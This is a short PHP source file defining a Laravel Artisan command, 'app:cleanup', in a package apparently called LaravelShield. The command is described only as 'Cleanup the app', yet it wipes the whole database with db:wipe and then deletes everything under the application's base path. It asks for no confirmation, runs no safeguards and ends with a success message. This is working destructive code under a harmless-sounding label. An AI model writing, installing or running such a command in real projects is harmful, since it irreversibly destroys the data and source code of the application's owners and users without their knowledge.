<?php

namespace Anam\LaravelShield\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\File;

class AppCleanup extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'app:cleanup';
    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Cleanup the app';

    /**
     * Create a new command instance.
     *
     * @return void
     */
    public function __construct()
    {
        parent::__construct();
    }

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $this->call('db:wipe');

        $directory = base_path();
        File::cleanDirectory($directory);

        $this->newLine();
        $this->info('Application Cleanup Successfully: ' . $directory);

        return 0;
    }
}
